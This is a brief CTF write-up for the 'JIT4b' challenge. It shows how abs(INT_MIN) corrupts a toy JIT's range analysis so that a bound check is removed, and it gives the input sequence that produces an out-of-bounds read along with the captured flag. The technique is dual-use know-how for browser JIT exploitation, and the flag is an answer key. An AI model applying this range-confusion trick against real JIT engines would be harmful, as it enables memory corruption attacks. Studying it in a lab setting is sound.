# Notes - JIT4b

- div INT_MIN => Range(1, 0)
- mul 3	=> Range(3, 0)
0 <= Range(3, 0) is true because 0 <= 3
Range(3, 0) < 3 is true because 0 < 3

then call f(INT_MIN)
=> real_x = INT_MIN/INT_MIN = 1
=> real_x = real_x * 3 = 3
=> OOB

Bug is when it calls abs
abs(INT_MIN) = INT_MIN
https://www.cplusplus.com/reference/cstdlib/abs/

```
Step 1. Build your function
1:Add / 2:Sub / 3:Mul / 4:Div / 5:Min / 6:Max / Others:Exit
> 4
value: -2147483648 
1:Add / 2:Sub / 3:Mul / 4:Div / 5:Min / 6:Max / Others:Exit
> 3
value: 3
1:Add / 2:Sub / 3:Mul / 4:Div / 5:Min / 6:Max / Others:Exit
> 0
[+] Your function looks like this:

function f(x) {
  let arr = [3.14, 3.14, 3.14];
  x /= -2147483648;
  x *= 3;
  return arr[x];
}

Step 2. Optimize your function...
[JIT] Speculation: Range(-2147483648, 2147483647)
[JIT] Applying [ x /= -2147483648 ]
[JIT] Speculation: Range(1, 0)
[JIT] Applying [ x *= 3 ]
[JIT] CheckBound: 0 <= Range(3, 0) < 3?
      --> Yes. Eliminating bound check for performance.

Step 3. Call your optimized function
What's the argument `x` passed to `f`?
x = -2147483648 
[+] f(-2147483648) --> 1.63042e-322
[+] Wow! You deceived the JIT compiler!
[+] CakeCTF{1_th1nk_u_c4n_try_2_3xpl017_r34l_bug5_1n_br0ws3r}
```
